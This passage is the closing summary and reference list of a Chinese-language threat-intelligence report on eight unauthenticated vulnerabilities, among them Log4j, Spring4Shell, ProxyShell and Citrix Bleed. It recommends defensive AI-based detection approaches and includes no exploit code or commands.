本報告詳細分析了八個針對關鍵基礎設施的高危險未經身份驗證漏洞。這些漏洞的共同點在於，它們都利用了應用程式邏輯中的基本缺陷——無論是日誌庫的過度解析（Log4j）、框架綁定的過度暴露（Spring）、協議處理的不一致（Exchange, F5）還是記憶體邊界檢查的缺失（Citrix）。

對於 AI 驅動的自動化檢測系統而言，識別這些威脅的關鍵在於：

1.  **語義理解:** 不能僅依賴正則表達式，必須理解協議的結構（如 HTTP Header 的依賴關係、序列化對象的結構）。

2.  **上下文關聯:** 許多漏洞（如 ProxyShell 和 Ivanti）需要多個請求的串聯，AI 需要具備跨請求的上下文記憶能力。

3.  **絕對確認:** 引入 OAST 和回應內容分析（如 Citrix 的 Token 洩露、Spring 的 Shell 訪問）可以將誤報率降至最低，實現自動化的阻斷與響應。

隨著軟體供應鏈的日益複雜，未來的威脅將更多地隱藏在像 Log4j 這樣的底層依賴中。建立一套基於「行為特徵」與「絕對指標」的 AI 檢測模型，將是防禦未知高危組件的唯一途徑。

報告生成者： 資深威脅情報分析師

資料來源索引： 1

#### 引用的著作

1.  Simulating and Preventing CVE-2021-44228 Apache Log4j RCE ..., 檢索日期：1月 19, 2026， [<u>https://www.picussecurity.com/resource/blog/simulating-and-preventing-cve-2021-44228-apache-log4j-rce-exploits</u>](https://www.picussecurity.com/resource/blog/simulating-and-preventing-cve-2021-44228-apache-log4j-rce-exploits)

2.  CVE-2021-44228 Detail - NVD, 檢索日期：1月 19, 2026， [<u>https://nvd.nist.gov/vuln/detail/cve-2021-44228</u>](https://nvd.nist.gov/vuln/detail/cve-2021-44228)

3.  Log4shell cve-2021-44228 - Sumo Logic, 檢索日期：1月 19, 2026， [<u>https://www.sumologic.com/blog/log4shell-cve-2021-44228</u>](https://www.sumologic.com/blog/log4shell-cve-2021-44228)

4.  Log4Shell Remote Code Execution - Sygnia, 檢索日期：1月 19, 2026， [<u>https://www.sygnia.co/threat-reports-and-advisories/log4shell-remote-code-execution-advisory/</u>](https://www.sygnia.co/threat-reports-and-advisories/log4shell-remote-code-execution-advisory/)

5.  Keysight's Take on Spring4Shell - CVE-2022-22965, 檢索日期：1月 19, 2026， [<u>https://www.keysight.com/blogs/en/tech/nwvs/2022/04/20/keysights-take-on-spring4shell</u>](https://www.keysight.com/blogs/en/tech/nwvs/2022/04/20/keysights-take-on-spring4shell)

6.  CVE-2022-22965: Spring Core Remote Code Execution Vulnerability Exploited In the Wild (SpringShell) (Updated) - Palo Alto Networks Unit 42, 檢索日期：1月 19, 2026， [<u>https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/</u>](https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/)

7.  Dissecting Spring4Shell - Outpost24, 檢索日期：1月 19, 2026， [<u>https://outpost24.com/blog/dissecting-spring4shell/</u>](https://outpost24.com/blog/dissecting-spring4shell/)

8.  Spring4Shell RCE \| Tutorials & examples - Snyk Learn, 檢索日期：1月 19, 2026， [<u>https://learn.snyk.io/lesson/spring4shell/</u>](https://learn.snyk.io/lesson/spring4shell/)

9.  Spring4Shell - CVE-2022-22965 - eSentire, 檢索日期：1月 19, 2026， [<u>https://www.esentire.com/security-advisories/esentire-threat-intelligence-advisory-spring4shell-cve-2022-22965</u>](https://www.esentire.com/security-advisories/esentire-threat-intelligence-advisory-spring4shell-cve-2022-22965)

10. Spring4Shell: Zero-Day Vulnerability in Spring Framework \| Rapid7 ..., 檢索日期：1月 19, 2026， [<u>https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/</u>](https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/)

11. Springing 4 Shells: The Tale of Two Spring CVEs - Splunk, 檢索日期：1月 19, 2026， [<u>https://www.splunk.com/en_us/blog/security/springing-4-shells-the-tale-of-two-spring-cves.html</u>](https://www.splunk.com/en_us/blog/security/springing-4-shells-the-tale-of-two-spring-cves.html)

12. The Spring4Shell vulnerability: Overview, detection, and remediation - Datadog, 檢索日期：1月 19, 2026， [<u>https://www.datadoghq.com/blog/spring4shell-vulnerability-overview-and-remediation/</u>](https://www.datadoghq.com/blog/spring4shell-vulnerability-overview-and-remediation/)

13. Confluence CVE-2022-26134 Zero-Day: Detection & Guidance - Darktrace, 檢索日期：1月 19, 2026， [<u>https://www.darktrace.com/blog/detection-and-guidance-for-the-confluence-cve-2022-26134-zero-day</u>](https://www.darktrace.com/blog/detection-and-guidance-for-the-confluence-cve-2022-26134-zero-day)

14. Atlassian Confluence OGNL Injection Remote Code Execution (RCE) Vulnerability (CVE-2022-26134) - Qualys Blog, 檢索日期：1月 19, 2026， [<u>https://blog.qualys.com/qualys-insights/2022/06/29/atlassian-confluence-ognl-injection-remote-code-execution-rce-vulnerability-cve-2022-26134</u>](https://blog.qualys.com/qualys-insights/2022/06/29/atlassian-confluence-ognl-injection-remote-code-execution-rce-vulnerability-cve-2022-26134)

15. TryHackMe \| Atlassian, CVE-2022–26134 WriteUp \| by Ajith Rajendran - Medium, 檢索日期：1月 19, 2026， [<u>https://medium.com/@ajithcrajendran/tryhackme-atlassian-cve-2022-26134-writeup-1a4e7c75515d</u>](https://medium.com/@ajithcrajendran/tryhackme-atlassian-cve-2022-26134-writeup-1a4e7c75515d)

16. ProxyShell vulnerabilities in Microsoft Exchange: What to do \| SOPHOS, 檢索日期：1月 19, 2026， [<u>https://www.sophos.com/fr-fr/blog/proxyshell-vulnerabilities-in-microsoft-exchange-what-to-do</u>](https://www.sophos.com/fr-fr/blog/proxyshell-vulnerabilities-in-microsoft-exchange-what-to-do)

17. Simulating and Preventing ProxyShell Exchange Exploits - Picus Security, 檢索日期：1月 19, 2026， [<u>https://www.picussecurity.com/resource/simulating-and-preventing-proxyshell-exchange-exploits</u>](https://www.picussecurity.com/resource/simulating-and-preventing-proxyshell-exchange-exploits)

18. ProxyShell: Deep Dive into the Exchange Vulnerabilities \| Keysight ..., 檢索日期：1月 19, 2026， [<u>https://www.keysight.com/blogs/en/tech/nwvs/2022/08/29/proxyshell-deep-dive-into-the-exchange-vulnerabilities</u>](https://www.keysight.com/blogs/en/tech/nwvs/2022/08/29/proxyshell-deep-dive-into-the-exchange-vulnerabilities)

19. Microsoft Exchange ProxyNotShell vulnerability explained and how to mitigate it, 檢索日期：1月 19, 2026， [<u>https://www.csoonline.com/article/574205/microsoft-exchange-proxynotshell-vulnerability-explained-and-how-to-mitigate-it.html</u>](https://www.csoonline.com/article/574205/microsoft-exchange-proxynotshell-vulnerability-explained-and-how-to-mitigate-it.html)

20. ProxyShell – A New Attack Surface on Microsoft Exchange Server (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) - Qualys ThreatPROTECT, 檢索日期：1月 19, 2026， [<u>https://threatprotect.qualys.com/2021/08/10/proxyshell-a-new-attack-surface-on-microsoft-exchange-server-cve-2021-34473-cve-2021-34523-cve-2021-31207/</u>](https://threatprotect.qualys.com/2021/08/10/proxyshell-a-new-attack-surface-on-microsoft-exchange-server-cve-2021-34473-cve-2021-34523-cve-2021-31207/)

21. PST, Want a Shell? ProxyShell Exploiting Microsoft Exchange Servers \| Google Cloud Blog, 檢索日期：1月 19, 2026， [<u>https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers</u>](https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers)

22. Am I I(n)-Control? CVE-2022-1388 Advisory - Hunters Security, 檢索日期：1月 19, 2026， [<u>https://www.hunters.security/en/blog/advisory-am-i-in-control-cve-2022-1388</u>](https://www.hunters.security/en/blog/advisory-am-i-in-control-cve-2022-1388)

23. F5 BIG-IP Remote Code Execution Vulnerability CVE-2022-1388 - Cyble, 檢索日期：1月 19, 2026， [<u>https://cyble.com/blog/f5-big-ip-remote-code-execution-vulnerability-cve-2022-1388/</u>](https://cyble.com/blog/f5-big-ip-remote-code-execution-vulnerability-cve-2022-1388/)

24. Threat Actors Exploiting F5 BIG-IP CVE-2022-1388 \| CISA, 檢索日期：1月 19, 2026， [<u>https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138a</u>](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138a)

25. Guidance for Addressing Citrix NetScaler ADC and Gateway Vulnerability CVE-2023-4966, Citrix Bleed \| CISA, 檢索日期：1月 19, 2026， [<u>https://www.cisa.gov/guidance-addressing-citrix-netscaler-adc-and-gateway-vulnerability-cve-2023-4966-citrix-bleed</u>](https://www.cisa.gov/guidance-addressing-citrix-netscaler-adc-and-gateway-vulnerability-cve-2023-4966-citrix-bleed)

26. Citrix Bleed: Leaking Session Tokens with CVE-2023-4966, 檢索日期：1月 19, 2026， [<u>https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966</u>](https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966)

27. CVE-2023-4966: LockBit Exploits Citrix Bleed in Ransomware Attacks - Picus Security, 檢索日期：1月 19, 2026， [<u>https://www.picussecurity.com/resource/blog/cve-2023-4966-lockbit-exploits-citrix-bleed-in-ransomware-attacks</u>](https://www.picussecurity.com/resource/blog/cve-2023-4966-lockbit-exploits-citrix-bleed-in-ransomware-attacks)

28. Reading arbitrary files via Jenkins' CLI: CVE-2024-23897 explained, 檢索日期：1月 19, 2026， [<u>https://www.hackthebox.com/blog/cve-2024-23897</u>](https://www.hackthebox.com/blog/cve-2024-23897)

29. Security Insights: Jenkins CVE-2024-23897 RCE - Splunk, 檢索日期：1月 19, 2026， [<u>https://www.splunk.com/en_us/blog/security/security-insights-jenkins-cve-2024-23897-rce.html</u>](https://www.splunk.com/en_us/blog/security/security-insights-jenkins-cve-2024-23897-rce.html)

30. Bitsight TRACE Systematic Approach: CVE-2024-23897 as a Case Study, 檢索日期：1月 19, 2026， [<u>https://www.bitsight.com/blog/bitsight-trace-systematic-approach-cve-2024-23897-case-study</u>](https://www.bitsight.com/blog/bitsight-trace-systematic-approach-cve-2024-23897-case-study)

31. Ivanti CVE-2023-46805 and CVE-2024-21887 Zero-Day Vulnerabilities Actively Exploited, 檢索日期：1月 19, 2026， [<u>https://www.picussecurity.com/resource/blog/ivanti-cve-2023-46805-and-cve-2024-21887-zero-day-vulnerabilities</u>](https://www.picussecurity.com/resource/blog/ivanti-cve-2023-46805-and-cve-2024-21887-zero-day-vulnerabilities)

32. CitrixBleed Mitigation CVE-2023-4966 - DevCentral - F5, 檢索日期：1月 19, 2026， [<u>https://community.f5.com/kb/codeshare/citrixbleed-mitigation-cve-2023-4966/326206</u>](https://community.f5.com/kb/codeshare/citrixbleed-mitigation-cve-2023-4966/326206)
